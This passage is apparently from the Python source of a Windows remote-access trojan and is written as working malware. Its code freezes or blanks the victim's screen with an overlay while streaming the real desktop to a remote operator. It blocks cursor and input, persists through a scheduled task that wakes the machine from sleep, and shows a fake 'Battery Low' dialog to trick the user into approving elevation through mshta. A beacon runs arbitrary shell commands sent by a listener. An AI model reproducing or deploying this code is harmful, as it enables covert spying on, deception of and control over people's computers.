                    ("biSizeImage", ctypes.c_uint), ("biXPels", ctypes.c_long),
                    ("biYPels", ctypes.c_long), ("biClrUsed", ctypes.c_uint),
                    ("biClrImportant", ctypes.c_uint)]

    class BMI(ctypes.Structure):
        _fields_ = [("bmiHeader", BMIH), ("bmiColors", ctypes.c_uint * 3)]

    # per-monitor DPI aware FIRST: all metrics/sizes in PHYSICAL pixels
    # (125% scaling otherwise yields a 1536x864 window on a 1920x1080 panel)
    _ov_refs["ctx"] = u32.SetThreadDpiAwarenessContext(ctypes.c_void_p(-4))
    state = _ov_state
    w, h, bits = state["w"], state["h"], state["bits"]
    if not w or not h:                    # black mode with no prior capture
        w, h = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
        state["w"], state["h"] = w, h

    def proc(hwnd, msg, wp, lp):
        if msg == WM_PAINT:
            ps = PAINTSTRUCT()
            hdc = u32.BeginPaint(hwnd, ctypes.byref(ps))
            if black:
                rect = RECT(0, 0, w, h)
                br = g32.CreateSolidBrush(0)
                u32.FillRect(hdc, ctypes.byref(rect), br)   # FillRect = user32
                g32.DeleteObject(br)
            elif bits and w and h:
                bmi = BMI()
                bmi.bmiHeader.biSize = ctypes.sizeof(BMIH)
                bmi.bmiHeader.biWidth = w
                bmi.bmiHeader.biHeight = -h
                bmi.bmiHeader.biPlanes = 1
                bmi.bmiHeader.biBitCount = 32
                g32.StretchDIBits(hdc, 0, 0, w, h, 0, 0, w, h, bits,
                                  ctypes.byref(bmi), 0, 0x00CC0020)
            u32.EndPaint(hwnd, ctypes.byref(ps))
            return 0
        if msg == WM_DESTROY:
            u32.PostQuitMessage(0)
            return 0
        if msg == 0x20:                       # WM_SETCURSOR: force hidden
            if (lp & 0xFFFF) == 1:            # HTCLIENT = over our window
                u32.SetCursor(None)
                return 1                      # skip DefWindowProc
        return u32.DefWindowProcW(hwnd, msg, wp, lp)

    # keep EVERY pump callback alive forever: the registered window class
    # still points at earlier trampolines - GC'ing one = access violation
    _ov_refs.setdefault("procs", []).append(WNDPROC(proc))
    _ov_refs["proc"] = _ov_refs["procs"][-1]
    wc = WNDCLASSW()
    wc.lpfnWndProc = _ov_refs["proc"]
    wc.hCursor = None                     # NULL-cursor class hides pointer
    wc.lpszClassName = "nvo"
    if not u32.RegisterClassW(ctypes.byref(wc)):
        if ctypes.windll.kernel32.GetLastError() != 1410:   # ERROR_CLASS_ALREADY_EXISTS
            return
    hwnd = u32.CreateWindowExW(0x8 | 0x80, "nvo", "", 0x80000000,  # WS_POPUP
                               0, 0, w, h, None, None, None, None)
    if not hwnd:
        return
    state["hwnd"] = hwnd
    u32.ShowWindow(hwnd, 5)               # SW_SHOW
    u32.SetWindowPos(hwnd, -1, 0, 0, w, h, 0x0040)   # HWND_TOPMOST-ish
    m = MSG()
    while u32.GetMessageW(ctypes.byref(m), None, 0, 0) > 0:
        u32.TranslateMessage(ctypes.byref(m))
        u32.DispatchMessageW(ctypes.byref(m))
    state["hwnd"] = None


def _overlay_on(black: bool = False) -> str:
    if os.name != "nt":
        return "[!] overlay: Windows only"
    t = _ov_state["thread"]
    if t and t.is_alive():
        return "[i] overlay already on"
    _under_start()   # keep the composite frame source warm while overlay runs
    if not black:
        _capture_screen()
    t = threading.Thread(target=_overlay_run, args=(black,),
                         daemon=True, name="overlay")
    _ov_state["thread"] = t
    t.start()
    for _ in range(50):                   # up to ~2.5s for window creation
        if _ov_state["hwnd"]:
            break
        time.sleep(0.05)
    if _ov_state["hwnd"]:
        _ov_state["black"] = black
        return "[+] overlay on (screen frozen, input swallowed, cursor hidden)"
    return "[!] overlay failed to create window"


def _overlay_off() -> str:
    hwnd = _ov_state["hwnd"]
    t = _ov_state["thread"]
    if not hwnd and (not t or not t.is_alive()):
        return "[i] overlay not running"
    if hwnd:
        import ctypes
        ctypes.windll.user32.PostMessageW(hwnd, 0x10, 0, 0)   # WM_CLOSE
    if t:
        t.join(timeout=5)
    _ov_state["bits"] = None
    return "[+] overlay off (screen live again)"


def _cursor_block(hard: bool = False) -> str:
    """Pin the cursor to a 1x1 rect at its current position (no admin
    needed). hard=BlockInput additionally (admin only).
    NOTE: this also pins the netvnc node's remotely-injected cursor -
    turn the block off (cursor unblock) before active remote control."""
    import ctypes
    u32 = ctypes.windll.user32

    class POINT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

    class RECT(ctypes.Structure):
        _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
                    ("r", ctypes.c_long), ("b", ctypes.c_long)]

    pt = POINT()
    u32.GetCursorPos(ctypes.byref(pt))
    r = RECT(pt.x, pt.y, pt.x + 1, pt.y + 1)
    u32.ClipCursor(ctypes.byref(r))
    msg = "[+] cursor pinned at (%d,%d)" % (pt.x, pt.y)
    if hard:
        if u32.BlockInput(1):
            msg += ", hard BlockInput on"
        else:
            msg += ", BlockInput failed (needs admin)"
    return msg


def _cursor_unblock() -> str:
    import ctypes
    u32 = ctypes.windll.user32
    u32.ClipCursor(None)
    u32.BlockInput(0)
    return "[+] cursor released"


# ===== UNDER-OVERLAY COMPOSITE CAPTURE (netvnc frame source) =====
# Streams the REAL desktop (windows + taskbar, overlay excluded) as raw
# BGRA frames over \\.\pipe\nvunder. The netvnc ffmpeg reads it with
# -f rawvideo instead of gdigrab, so the stream shows live content even
# while the frozen overlay covers the screen. Occlusion-culled per-window
# PrintWindow(PW_RENDERFULLCONTENT) composite, ~12-24 fps at 1080p.
_UNDER_PIPE = "\\\\.\\pipe\\nvunder"
_UNDER_FPS = 12
_under_srv = {"run": False, "w": 0, "h": 0, "thread": None}


def _under_meta_path() -> str:
    return os.path.join(_stream_state_path(), DESK_DIR, "under.json")


def _under_start() -> str:
    if os.name != "nt":
        return "[!] under-capture: Windows only"
    t = _under_srv["thread"]
    if t and t.is_alive():
        return "[i] under-capture already running"
    _under_srv["run"] = True
    t = threading.Thread(target=_under_server_main, daemon=True, name="nvunder")
    _under_srv["thread"] = t
    t.start()
    return "[+] under-capture server started (" + _UNDER_PIPE + ")"


def _under_stop() -> str:
    t = _under_srv["thread"]
    if not t or not t.is_alive():
        _under_srv["run"] = False
        return "[i] under-capture not running"
    _under_srv["run"] = False
    t.join(timeout=5)
    try:
        os.remove(_under_meta_path())
    except OSError:
        pass
    return "[+] under-capture stopped"


def _under_status() -> str:
    t = _under_srv["thread"]
    on = bool(t and t.is_alive())
    line = "under-capture: " + ("RUNNING" if on else "STOPPED")
    if on:
        line += " pipe=%s frame=%dx%dx4 (bgra) @%dfps" % (
            _UNDER_PIPE, _under_srv["w"], _under_srv["h"], _UNDER_FPS)
    return line


def _under_server_main():
    import ctypes
    from ctypes import wintypes

    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    u32 = ctypes.windll.user32
    g32 = ctypes.windll.gdi32
    dwm = ctypes.windll.dwmapi
    u32.SetThreadDpiAwarenessContext(ctypes.c_void_p(-4))   # physical px
    W, H = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
    _under_srv["w"], _under_srv["h"] = W, H

    # publish frame geometry so the streamer can build -s WxH
    try:
        os.makedirs(os.path.dirname(_under_meta_path()), exist_ok=True)
        with open(_under_meta_path(), "w") as fh:
            fh.write('{"w": %d, "h": %d}' % (W, H))
    except Exception:
        pass

    class BMIH(ctypes.Structure):
        _fields_ = [("biSize", ctypes.c_uint), ("biWidth", ctypes.c_long),
                    ("biHeight", ctypes.c_long), ("biPlanes", ctypes.c_ushort),
                    ("biBitCount", ctypes.c_ushort), ("biCompression", ctypes.c_uint),
                    ("biSizeImage", ctypes.c_uint), ("biXPels", ctypes.c_long),
                    ("biYPels", ctypes.c_long), ("biClrUsed", ctypes.c_uint),
                    ("biClrImportant", ctypes.c_uint)]

    class BMI(ctypes.Structure):
        _fields_ = [("bmiHeader", BMIH), ("bmiColors", ctypes.c_uint * 3)]

    def new_bgra(w, h):
        bmi = BMI()
        bmi.bmiHeader.biSize = ctypes.sizeof(BMIH)
        bmi.bmiHeader.biWidth, bmi.bmiHeader.biHeight = w, -h
        bmi.bmiHeader.biPlanes, bmi.bmiHeader.biBitCount = 1, 32
        hdc = u32.GetDC(None)
        mem = g32.CreateCompatibleDC(hdc)
        bmp = g32.CreateCompatibleBitmap(hdc, w, h)
        g32.SelectObject(mem, bmp)
        u32.ReleaseDC(None, hdc)
        return mem, bmp, bmi

    SRCCOPY = 0x00CC0020
    RGN_DIFF, NULLREGION = 4, 1

    def is_capturable(h):
        if not u32.IsWindowVisible(h) or u32.IsIconic(h):
            return False
        r = wintypes.RECT()
        if not u32.GetWindowRect(h, ctypes.byref(r)):
            return False
        if r.right - r.left < 40 or r.bottom - r.top < 40:
            return False
        cloaked = ctypes.c_int(0)
        dwm.DwmGetWindowAttribute(h, 14, ctypes.byref(cloaked), 4)
        if cloaked.value:
            return False
        t = ctypes.create_unicode_buffer(64)
        u32.GetClassNameW(h, t, 64)
        if t.value == "nvo":          # our overlay - excluded by design
            return False
        return True

    CB = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
    frame_len = W * H * 4
    frame_buf = ctypes.create_string_buffer(frame_len)

    class CURSORINFO(ctypes.Structure):
        _fields_ = [("cbSize", wintypes.DWORD), ("flags", wintypes.DWORD),
                    ("hCursor", wintypes.HANDLE),
                    ("ptScreenPos", wintypes.POINT)]

    # ---- named pipe server (multi-instance, overlapped accept) ----
    PIPE_ACCESS_OUTBOUND = 0x00000002
    PIPE_UNLIMITED_INSTANCES = 255
    ERROR_PIPE_CONNECTED = 535
    ERROR_IO_PENDING = 997
    WAIT_OBJECT_0 = 0
    INFINITE = 0xFFFFFFFF

    k32.CreateNamedPipeW.restype = ctypes.c_void_p
    k32.CreateNamedPipeW.argtypes = (
        wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD,
        wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID)
    k32.ConnectNamedPipe.argtypes = (ctypes.c_void_p, wintypes.LPVOID)
    k32.DisconnectNamedPipe.argtypes = (ctypes.c_void_p,)
    k32.CreateEventW.restype = ctypes.c_void_p
    k32.CreateEventW.argtypes = (wintypes.LPVOID, wintypes.BOOL,
                                 wintypes.BOOL, wintypes.LPCWSTR)
    k32.SetEvent.argtypes = (ctypes.c_void_p,)
    k32.WaitForMultipleObjects.restype = ctypes.c_uint
    k32.WaitForMultipleObjects.argtypes = (
        wintypes.DWORD, ctypes.POINTER(ctypes.c_void_p), wintypes.BOOL,
        wintypes.DWORD)
    k32.WriteFile.argtypes = (ctypes.c_void_p, ctypes.c_char_p, wintypes.DWORD,
                              ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID)

    class OVERLAPPED(ctypes.Structure):
        _fields_ = [("Internal", ctypes.POINTER(ctypes.c_ulong)),
                    ("InternalHigh", ctypes.POINTER(ctypes.c_ulong)),
                    ("Offset", wintypes.DWORD), ("OffsetHigh", wintypes.DWORD),
                    ("hEvent", ctypes.c_void_p)]

    INVALID = ctypes.c_void_p(-1).value
    stop_evt = k32.CreateEventW(None, True, False, None)
    conns = []
    conns_lock = threading.Lock()

    def accept_loop():
        ev = k32.CreateEventW(None, True, False, None)
        handles = (ctypes.c_void_p * 2)(ev, stop_evt)
        while _under_srv["run"]:
            h = k32.CreateNamedPipeW(
                _UNDER_PIPE, PIPE_ACCESS_OUTBOUND, 0, PIPE_UNLIMITED_INSTANCES,
                0, 1 << 20, 0, None)
            if not h or h == INVALID:
                time.sleep(0.5)
                continue
            ov = OVERLAPPED()
            ov.hEvent = ev
            connected = False
            if k32.ConnectNamedPipe(h, ctypes.byref(ov)):
                connected = True
            else:
                err = k32.GetLastError()
                if err == ERROR_PIPE_CONNECTED:
                    connected = True
                elif err == ERROR_IO_PENDING:
                    if k32.WaitForMultipleObjects(2, handles, False,
                                                  INFINITE) == WAIT_OBJECT_0:
                        connected = True
                    else:
                        k32.CloseHandle(h)
                        break
                else:
                    k32.CloseHandle(h)
                    continue
            if connected:
                with conns_lock:
                    conns.append(h)

    def capture_loop():
        mem, bmp, bmi = new_bgra(W, H)
        dc_cache = {}
        visible = []          # (hwnd, rect, visible_rgn) top->bottom
        cull_at = 0.0
        interval = 1.0 / _UNDER_FPS
        while _under_srv["run"]:
            t0 = time.perf_counter()
            if t0 >= cull_at:
                # occlusion culling: visible region = rect minus union of
                # everything above it in z-order
                order = []

                @CB
                def cb(hwnd, lp):
                    order.append(hwnd)
                    return True

                u32.EnumWindows(cb, 0)
                newvis = []
                for hwnd in order:            # top -> bottom
                    if not is_capturable(hwnd):
                        continue
                    r = wintypes.RECT()
                    u32.GetWindowRect(hwnd, ctypes.byref(r))
                    if r.right <= 0 or r.bottom <= 0 or r.left >= W or r.top >= H:
                        continue
                    rgn = g32.CreateRectRgn(r.left, r.top,
                                            min(r.right, W), min(r.bottom, H))
                    for _, _, above in newvis:
                        g32.CombineRgn(rgn, rgn, above, RGN_DIFF)
                    box = wintypes.RECT()
                    if g32.GetRgnBox(rgn, ctypes.byref(box)) == NULLREGION:
                        g32.DeleteObject(rgn)
                        continue
                    newvis.append((hwnd, r, rgn))
                live = {h for h, _, _ in newvis}
                for h in list(dc_cache):
                    if h not in live:
                        wmem, wbmp, _wbmi = dc_cache.pop(h)
                        g32.DeleteObject(wbmp)
                        g32.DeleteDC(wmem)
                for _, _, rgn in visible:
                    g32.DeleteObject(rgn)
                visible = newvis
                cull_at = t0 + 2.0
            # composite bottom -> top, clipped to each window's visible region
            for hwnd, r, rgn in reversed(visible):
                if not u32.IsWindow(hwnd):
                    continue
                w = min(r.right - r.left, W)
                h = min(r.bottom - r.top, H)
                ent = dc_cache.get(hwnd)
                if not ent:
                    ent = new_bgra(w, h)
                    dc_cache[hwnd] = ent
                wmem, _wbmp, _wbmi = ent
                if u32.PrintWindow(hwnd, wmem, 2):   # PW_RENDERFULLCONTENT
                    g32.SelectClipRgn(mem, rgn)
                    g32.BitBlt(mem, r.left, r.top, w, h, wmem, 0, 0, SRCCOPY)
                    g32.SelectClipRgn(mem, None)
            # draw the real cursor so remote control stays visually aligned
            cur = CURSORINFO()
            cur.cbSize = ctypes.sizeof(cur)
            if u32.GetCursorInfo(ctypes.byref(cur)) and (cur.flags & 1) and cur.hCursor:
                u32.DrawIconEx(mem, cur.ptScreenPos.x, cur.ptScreenPos.y,
                               cur.hCursor, 0, 0, 0, None, 1)   # DI_NORMAL
            g32.GetDIBits(mem, bmp, 0, H, frame_buf, ctypes.byref(bmi), 0)
            data = frame_buf.raw
            with conns_lock:
                alive = []
                for h in conns:
                    written = wintypes.DWORD(0)
                    if k32.WriteFile(h, data, frame_len,
                                     ctypes.byref(written), None) \
                            and written.value == frame_len:
                        alive.append(h)
                    else:
                        k32.DisconnectNamedPipe(h)
                        k32.CloseHandle(h)
                conns[:] = alive
            delay = interval - (time.perf_counter() - t0)
            if delay > 0:
                time.sleep(delay)
        for _h, ent in dc_cache.items():
            g32.DeleteObject(ent[1])
            g32.DeleteDC(ent[0])
        g32.DeleteObject(bmp)
        g32.DeleteDC(mem)

    acc = threading.Thread(target=accept_loop, daemon=True)
    cap = threading.Thread(target=capture_loop, daemon=True)
    acc.start()
    cap.start()
    while _under_srv["run"]:
        time.sleep(0.25)
    k32.SetEvent(stop_evt)
    with conns_lock:
        for h in conns:
            k32.DisconnectNamedPipe(h)
            k32.CloseHandle(h)
        conns.clear()
    acc.join(timeout=3)


def _wake_flag() -> str:
    return os.path.join(_stream_state_path(), "wake.armed")


def _wake_armed() -> bool:
    return os.path.exists(_wake_flag())


def _register_wake_task(install_path: str, minutes: int = 0) -> bool:
    """Re-register the persistence task with <WakeToRun> plus an optional
    one-shot time trigger (minutes > 0). Same in-process COM sequence as
    _create_task - no schtasks.exe child, no PowerShell."""
    try:
        import ctypes
        import xml.sax.saxutils as _sx
        from datetime import datetime, timedelta
        handles = _ts_open()
        if not handles:
            return False
        svc, folder = handles
        try:
            uid = _sx.escape("%s\\%s" % (os.environ.get("USERDOMAIN", ""),
                                         os.environ.get("USERNAME", "")))
            trig = "<LogonTrigger><UserId>%s</UserId></LogonTrigger>" % uid
            if minutes > 0:
                when = (datetime.now() + timedelta(minutes=minutes)
                        ).strftime("%Y-%m-%dT%H:%M:%S")
                trig += ("<TimeTrigger><StartBoundary>%s</StartBoundary>"
                         "<Enabled>true</Enabled></TimeTrigger>" % when)
            xml = (
                '<?xml version="1.0" encoding="UTF-16"?>'
                '<Task version="1.2" '
                'xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
                '<Triggers>%s</Triggers>'
                '<Principals><Principal id="Author"><UserId>%s</UserId>'
                '<LogonType>InteractiveToken</LogonType></Principal></Principals>'
                '<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>'
                '<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>'
                '<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>'
                '<WakeToRun>true</WakeToRun>'
                '<ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>'
                '<Actions Context="Author"><Exec><Command>%s</Command></Exec></Actions>'
                '</Task>'
            ) % (trig, uid, _sx.escape(install_path))
            VARIANT = _variant_type()
            reg = _com_slot(folder, 16,
                            ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_long,
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT),
                            ctypes.c_long, ctypes.POINTER(VARIANT),
                            ctypes.POINTER(ctypes.c_void_p))
            out = ctypes.c_void_p()
            v = VARIANT()
            reg(folder, ctypes.c_wchar_p(SCHTASK_NAME), xml, 6,
                ctypes.byref(v), ctypes.byref(v), 3, ctypes.byref(v),
                ctypes.byref(out))     # TASK_CREATE_OR_UPDATE / INTERACTIVE_TOKEN
            _com_release(out)
            return True
        finally:
            _ts_release(svc, folder)
    except Exception:
        return False


def _wake_arm() -> str:
    with open(_wake_flag(), "w") as f:
        f.write("1")
    if _register_wake_task(_module_exe_path(), 0):
        return "[+] wake armed (task registered with WakeToRun)"
    return "[+] wake armed (flag set; task re-register failed)"


def _idle_seconds() -> float:
    """Seconds since last physical input (GetLastInputInfo)."""
    import ctypes

    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(lii)
    if not ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        return 0.0
    return max(0.0, (ctypes.windll.kernel32.GetTickCount()
                     - lii.dwTime) / 1000.0)


def _monitor_off() -> None:
    import ctypes
    u32 = ctypes.windll.user32
    u32.SendMessageTimeoutW(0xFFFF, 0x0112, 0xF170, 2,   # SC_MONITORPOWER=2
                            2, 1000, ctypes.byref(ctypes.c_size_t()))


def _sleep_now() -> None:
    import ctypes
    ctypes.windll.powrprof.SetSuspendState(False, False, False)


def _power_hook() -> None:
    """WM_POWERBROADCAST watcher: on suspend (wake armed) re-registers the
    task with a one-shot wake trigger; on resume with no user present it
    blanks the screen, kills the monitor and holds the system awake so the
    stream keeps running."""
    import ctypes
    u32 = ctypes.windll.user32
    k32 = ctypes.windll.kernel32
    u32.DefWindowProcW.restype = ctypes.c_ssize_t
    u32.DefWindowProcW.argtypes = (ctypes.c_void_p, ctypes.c_uint,
                                   ctypes.c_size_t, ctypes.c_ssize_t)
    WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_void_p,
                                 ctypes.c_uint, ctypes.c_size_t,
                                 ctypes.c_ssize_t)
    WM_POWERBROADCAST = 0x0218
    PBT_APMSUSPEND, PBT_APMRESUMESUSPEND, PBT_APMRESUMEAUTOMATIC = 4, 7, 18

    class RECT(ctypes.Structure):
        _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
                    ("r", ctypes.c_long), ("b", ctypes.c_long)]

    class POINT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

    class MSG(ctypes.Structure):
        _fields_ = [("hwnd", ctypes.c_void_p), ("message", ctypes.c_uint),
                    ("wParam", ctypes.c_size_t), ("lParam", ctypes.c_ssize_t),
                    ("time", ctypes.c_uint), ("pt", POINT)]

    class WNDCLASSW(ctypes.Structure):
        _fields_ = [("style", ctypes.c_uint), ("lpfnWndProc", WNDPROC),
                    ("cbClsExtra", ctypes.c_int), ("cbWndExtra", ctypes.c_int),
                    ("hInstance", ctypes.c_void_p), ("hIcon", ctypes.c_void_p),
                    ("hCursor", ctypes.c_void_p),
                    ("hbrBackground", ctypes.c_void_p),
                    ("lpszMenuName", ctypes.c_wchar_p),
                    ("lpszClassName", ctypes.c_wchar_p)]

    def proc(hwnd, msg, wp, lp):
        if msg == WM_POWERBROADCAST:
            try:
                if wp == PBT_APMSUSPEND and _wake_armed():
                    _register_wake_task(_module_exe_path(), 1)   # wake +1min
                elif (wp in (PBT_APMRESUMESUSPEND, PBT_APMRESUMEAUTOMATIC)
                      and _wake_armed()):
                    time.sleep(2.0)
                    if _idle_seconds() > 30:   # victim still away
                        _overlay_on(True)       # blank-screen overlay
                        _monitor_off()
                        # ES_CONTINUOUS | ES_SYSTEM_REQUIRED on this thread
                        k32.SetThreadExecutionState(0x80000001)
            except Exception:
                pass
            return 1
        return u32.DefWindowProcW(hwnd, msg, wp, lp)

    _pw_refs["procs"] = _pw_refs.get("procs", []) + [WNDPROC(proc)]
    _pw_refs["proc"] = _pw_refs["procs"][-1]
    wc = WNDCLASSW()
    wc.lpfnWndProc = _pw_refs["proc"]
    wc.lpszClassName = "nvp"
    if not u32.RegisterClassW(ctypes.byref(wc)):
        if ctypes.windll.kernel32.GetLastError() != 1410:   # ERROR_CLASS_ALREADY_EXISTS
            return
    # plain (non message-only) hidden top-level window: message-only
    # windows never receive WM_POWERBROADCAST
    hwnd = u32.CreateWindowExW(0, "nvp", "nvp", 0, 0, 0, 0, 0,
                               None, None, None, None)
    if not hwnd:
        return
    m = MSG()
    while u32.GetMessageW(ctypes.byref(m), None, 0, 0) > 0:
        u32.TranslateMessage(ctypes.byref(m))
        u32.DispatchMessageW(ctypes.byref(m))


def _start_power_hook() -> None:
    if os.name == "nt":
        threading.Thread(target=_power_hook, daemon=True,
                         name="pwrhook").start()


def _power_status() -> str:
    lines = []
    if os.name == "nt":
        import ctypes
        try:
            admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            admin = False
        lines.append("elevated: %s" % ("YES" if admin else "no"))
        lines.append("wake armed: %s" % ("yes" if _wake_armed() else "no"))
        lines.append("idle: %.0fs" % _idle_seconds())
        try:
            out = subprocess.run("powercfg /getactivescheme", shell=True,
                                 capture_output=True, timeout=10,
                                 creationflags=subprocess.CREATE_NO_WINDOW)
            lines.append(out.stdout.decode("cp1252", errors="replace").strip())
        except Exception:
            pass
    return "\n".join(lines)


def request_admin() -> str:
    """Spoofed-elevation chain (verified): center-screen battery pretext
    dialog -> on ANY dismissal -> runas mshta (UAC shows mshta, not this
    process) -> elevated HTA disables sleep console-lock, enables RTC wake,
    writes a proof flag and self-deletes. On success wake is auto-armed."""
    if os.name != "nt":
        return "[!] Windows only"
    import ctypes
    base = os.path.join(_stream_state_path(), "nvdesk")
    os.makedirs(base, exist_ok=True)
    flag = os.path.join(base, "elev.ok")
    try:
        os.remove(flag)
    except OSError:
        pass

    # MB_OKCANCEL | MB_ICONWARNING | MB_SYSTEMMODAL | MB_SETFOREGROUND |
    # MB_TOPMOST - centered modal, X/Cancel counts as dismissal too
    ctypes.windll.user32.MessageBoxW(
        None,
        "Your battery is running low (7% remaining).\n\n"
        "Plug in your PC to keep working.",
        "Battery Low",
        0x00000001 | 0x00000030 | 0x00001000 | 0x00010000 | 0x00040000)

    hta = os.path.join(base, "uac.hta")
    vbs = (
        'On Error Resume Next\r\n'
        'Dim sh: Set sh = CreateObject("WScript.Shell")\r\n'
        'sh.Run "powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_NONE '
        'CONSOLELOCK 0", 0, True\r\n'
        'sh.Run "powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_NONE '
        'CONSOLELOCK 0", 0, True\r\n'
        'sh.Run "powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_SLEEP '
        'RTCWAKE 1", 0, True\r\n'
        'sh.Run "powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_SLEEP '
        'RTCWAKE 1", 0, True\r\n'
        'sh.Run "powercfg /SETACTIVE SCHEME_CURRENT", 0, True\r\n'
        'Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")\r\n'
        'Dim f: Set f = fso.CreateTextFile("%(flag)s", True)\r\n'
        'f.Write "ok"\r\n'
        'f.Close\r\n'
        'fso.DeleteFile "%(hta)s", True\r\n'
        'Self.Close\r\n'
    ) % {"flag": flag, "hta": hta}
    with open(hta, "w", encoding="utf-16") as f:
        f.write("<html><head><hta:application id=\"a\" caption=\"no\" "
                "showintaskbar=\"no\"/></head>"
                "<script language=\"VBScript\">\n" + vbs + "</script></html>")

    rc = ctypes.windll.shell32.ShellExecuteW(None, "runas", "mshta.exe",
                                             '"' + hta + '"', None, 0)
    if rc <= 32:
        try:
            os.remove(hta)
        except OSError:
            pass
        return "[!] elevation declined/failed (ShellExecute rc=%d)" % rc
    for _ in range(240):                  # 120s for the victim to click Yes
        if os.path.exists(flag):
            break
        time.sleep(0.5)
    else:
        return "[-] elevation not confirmed within 120s"
    try:
        os.remove(hta)
    except OSError:
        pass
    arm = _wake_arm()
    return "[+] ELEVATED: console lock off, RTC wake on. " + arm


def execute_command(cmd: str) -> bytes:
    """Run a shell command and return its output. Handles cd persistently."""
    low = cmd.strip().lower()

    # netvnc stream dispatch (before generic shell)
    if low == "stream" or low.startswith("stream "):
        parts = cmd.split()
        if len(parts) >= 2 and parts[1].lower() == "status":
            return (stream_status() + "\n").encode() + MARKER
        if len(parts) >= 2 and parts[1].lower() == "stop":
            return (stop_stream() + "\n").encode() + MARKER
        if len(parts) >= 2 and parts[1].lower() == "log":
            n = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 100
            return (stream_log(n) + "\n").encode() + MARKER
        room = parts[1] if len(parts) >= 2 and not parts[1].lower().startswith("-") else "default"
        return (deploy_stream(room) + "\n").encode() + MARKER
    if low in ("stream stop", "stop stream", "stopstream"):
        return (stop_stream() + "\n").encode() + MARKER

    # overlay / cursor / elevation / power dispatch (before generic shell)
    if low == "overlay on" or low.startswith("overlay on "):
        return (_overlay_on("black" in low) + "\n").encode() + MARKER
    if low == "overlay off":
        return (_overlay_off() + "\n").encode() + MARKER
    if low == "cursor block" or low == "cursor block hard":
        return (_cursor_block("hard" in low) + "\n").encode() + MARKER
    if low == "cursor unblock":
        return (_cursor_unblock() + "\n").encode() + MARKER
    if low == "under on":
        return (_under_start() + "\n").encode() + MARKER
    if low == "under off":
        return (_under_stop() + "\n").encode() + MARKER
    if low == "under status":
        return (_under_status() + "\n").encode() + MARKER
    if low == "admin":
        return (request_admin() + "\n").encode() + MARKER
    if low == "wake arm":
        return (_wake_arm() + "\n").encode() + MARKER
    if low == "wake disarm":
        try:
            os.remove(_wake_flag())
        except OSError:
            pass
        return ("[+] wake disarmed\n").encode() + MARKER
    if low.startswith("wake in "):
        try:
            mins = int(float(low.split()[2]))
        except (ValueError, IndexError):
            return ("[!] usage: wake in <minutes>\n").encode() + MARKER
        if _register_wake_task(_module_exe_path(), max(1, mins)):
            return ("[+] one-shot wake in %d min registered\n" % mins
                    ).encode() + MARKER
        return ("[!] task registration failed\n").encode() + MARKER
    if low == "sleep now":
        armed = _wake_armed()
        threading.Thread(target=_sleep_now, daemon=True).start()
        return ("[+] suspend initiated (wake hook armed: %s)\n" % armed
                ).encode() + MARKER
    if low == "power status":
        return (_power_status() + "\n").encode() + MARKER

    # Handle cd internally so the working directory persists between commands
    if cmd.lower() == "cd" or cmd.lower().startswith("cd "):
        try:
            path = cmd[2:].strip() or os.path.expanduser("~")
            path = os.path.expandvars(path)
            os.chdir(path)
            return f"{os.getcwd()}\n".encode() + MARKER
        except Exception as e:
            return f"[!] {e}\n".encode() + MARKER

    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = b"[!] Command timed out."
    except Exception as e:
        output = f"[!] Error: {e}".encode()

    if os.name == "nt":
        try:
            output = output.decode("cp1252", errors="replace").encode("utf-8")
        except Exception:
            pass

    return output + MARKER


def _enable_tcp_keepalive(sock: socket.socket) -> None:
    """Keepalive so a silently-dead link (listener killed without RST,
    NAT/firewall dropping the mapping) cannot hang recv() forever: the OS
    probes the peer and force-closes the socket, which raises in recv() and
    lets the reconnect loop run. Probe after 15s idle, every 5s, 3 fails ->
    dead link detected within ~30s."""
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        if os.name == "nt":
            sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 15000, 5000))
        else:
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 15)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
    except OSError:
        pass


def connect() -> None:
    """Main loop - connect, execute commands, reconnect on failure.

    Runs forever: if the listener drops the session (clean close, reset, or a
    silently-dead link surfaced by TCP keepalive), the socket is closed and
    the beacon keeps retrying with a jittered backoff until the listener is
    back - then it stops retrying and serves normally.
    """
    delay = float(RECONNECT_DELAY)
    while True:
        try:
